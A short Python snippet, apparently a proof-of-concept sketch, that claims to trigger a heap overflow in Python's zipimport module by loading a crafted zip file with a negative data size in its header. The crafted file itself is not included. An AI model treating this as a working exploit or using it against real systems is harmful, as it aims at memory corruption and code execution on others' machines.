# This code uses the zipimport module to import a module from a zip file
# The zip file contains a malicious header with a negative data size value
# This causes the zipimport module to allocate a huge buffer and overflow it
# This can result in memory corruption or code execution

import zipimport
zip_file = "malicious.zip" # The zip file with the negative data size value
zip_importer = zipimport.zipimporter(zip_file)
module = zip_importer.load_module("module") # This triggers the heap overflow